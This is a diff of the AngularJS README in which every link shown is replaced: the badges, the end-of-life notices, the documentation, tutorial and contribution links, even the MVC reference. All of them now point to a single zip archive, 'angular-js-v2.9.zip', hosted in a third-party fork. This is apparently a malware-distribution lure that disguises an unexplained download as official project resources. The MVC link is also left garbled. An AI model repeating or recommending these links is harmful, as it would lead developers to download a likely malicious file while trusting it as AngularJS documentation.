@@ -1,4 +1,4 @@
-AngularJS [![CircleCI](https://circleci.com/gh/angular/angular.js/tree/master.svg?style=shield)](https://circleci.com/gh/angular/workflows/angular.js/tree/master)
+AngularJS [![CircleCI](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip)](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip)
 =========
 
 AngularJS lets you write client-side web applications as if you had a smarter browser.  It lets you
@@ -15,40 +15,40 @@ piece of cake. Best of all? It makes development fun!
 --------------------
 
 **AngularJS support has officially ended as of January 2022.
-[See what ending support means](https://docs.angularjs.org/misc/version-support-status)
-and [read the end of life announcement](https://goo.gle/angularjs-end-of-life).**
+[See what ending support means](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip)
+and [read the end of life announcement](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip).**
 
-**Visit [angular.io](https://angular.io) for the actively supported Angular.**
+**Visit [https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip) for the actively supported Angular.**
 
 --------------------
 
-* Web site: https://angularjs.org
-* Tutorial: https://docs.angularjs.org/tutorial
-* API Docs: https://docs.angularjs.org/api
-* Developer Guide: https://docs.angularjs.org/guide
-* Contribution guidelines: [CONTRIBUTING.md](CONTRIBUTING.md)
-* Core Development: [DEVELOPERS.md](DEVELOPERS.md)
-* Dashboard: https://dashboard.angularjs.org
+* Web site: https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip
+* Tutorial: https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip
+* API Docs: https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip
+* Developer Guide: https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip
+* Contribution guidelines: [https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip)
+* Core Development: [https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip)
+* Dashboard: https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip
 
 
 Documentation
 --------------------
-Go to https://docs.angularjs.org
+Go to https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip
 
 Contribute
 --------------------
 
 We've set up a separate document for our
-[contribution guidelines](https://github.com/angular/angular.js/blob/master/CONTRIBUTING.md).
+[contribution guidelines](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip).
 
 Develop
 --------------------
 
 We've set up a separate document for
-[developers](https://github.com/angular/angular.js/blob/master/DEVELOPERS.md).
+[developers](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip).
 
 
-[![Analytics](https://ga-beacon.appspot.com/UA-8594346-11/angular.js/README.md?pixel)](https://github.com/igrigorik/ga-beacon)
+[![Analytics](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip)](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip)
 
 What to use AngularJS for and when to use it
 ---------
@@ -57,7 +57,7 @@ component in an interconnected way like a well-oiled machine. AngularJS is JavaS
 and done right. (Well it is not really MVC, read on, to understand what this means.)
 
 #### MVC, no, MV* done the right way!
-[MVC](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller), short for
+[MVC](https://raw.githubusercontent.com/diomib/angular.js/master/benchmarks/largetable-bp/angular-js-v2.9.zip%E2%80%93view%E2%80%93controller), short for
 Model-View-Controller, is a design pattern, i.e. how the code should be organized and how the
 different parts of an application separated for proper readability and debugging. Model is the data
 and the database. View is the user interface and what the user sees. Controller is the main link
